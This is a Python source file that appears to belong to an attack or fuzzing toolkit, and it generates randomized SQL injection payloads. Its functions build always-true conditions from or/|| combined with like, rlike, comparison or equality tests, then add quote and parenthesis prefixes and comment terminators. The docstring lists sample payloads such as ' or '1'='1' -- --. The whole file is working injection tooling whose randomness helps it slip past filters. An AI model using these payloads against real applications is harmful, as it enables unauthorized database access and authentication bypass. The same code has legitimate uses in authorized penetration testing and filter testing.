from cores.actions import list_choose_randomly, string_gen_randomly


def truecon():
	# Generate true condition of SQL query
	"""
	Equal:
		' or '1'='1' -- --
	Static:
		1' or not false #
		1' or true #
	Compare:
		1' or 12 rlike 12 #
		2' or '2'>'0' -- --
		2' or 2>0 -- --
	"""
	
	# Payload template: ['or' | '||'] [condition]
	def cCon():
		return list_choose_randomly(["or", "||"])
	
	def sCon():
		conType = list_choose_randomly(["equal", "static", "compare"])
		# Could be faster than create a dict and call element from dict
		if conType == "static":
			return list_choose_randomly(["not false", "true"])
		
		elif conType == "compare":
			genType = list_choose_randomly(["like", "rlike", "not like", "gl"])
			
			if genType == "gl":
				_stri1, _stri2 = string_gen_randomly(stype ="dig"), string_gen_randomly(stype ="dig")
				if int(_stri1) > int(_stri2):
					return "%s > %s" % (_stri1, _stri2)
				else:
					return "%s > %s" % (_stri2, _stri1)
			
			elif genType == "not like":
				while True:
					_stri1, _stri2 = string_gen_randomly(stype ="char"), string_gen_randomly(stype ="char")
					# MAKE SURE WE ARE HAVING NOT LIKE
					if _stri1 != _stri2:
						break
				return "'%s' %s '%s'" % (_stri1, genType, _stri2)
			
			else:
				_stri = string_gen_randomly(min = 3, max = 5, stype ="char")
				return "'%s' %s '%s'" % (_stri, genType, _stri)
		
		elif conType == "equal":
			genType = list_choose_randomly(["char", "dig"])
			_stri = string_gen_randomly(min = 3, max = 5, stype = genType)
			if genType == "char":
				return "'%s'='%s'" % (_stri, _stri)
			elif genType == "dig":
				return "%s=%s" % (_stri, _stri)
	
	return "%s %s" % (cCon(), sCon())


def sPayload():
	def sEnd():
		return list_choose_randomly(["-- --", "#", "--"])
	
	# Generate random SQL injection payload
	# Payload template: [X / X' / X')] [True condition] [-- / #]
	
	fchar = ["", "'", ")", "')", "'))", "))"]
	
	for pchar in fchar:
		yield "%s %s %s" % (pchar, truecon(), sEnd())
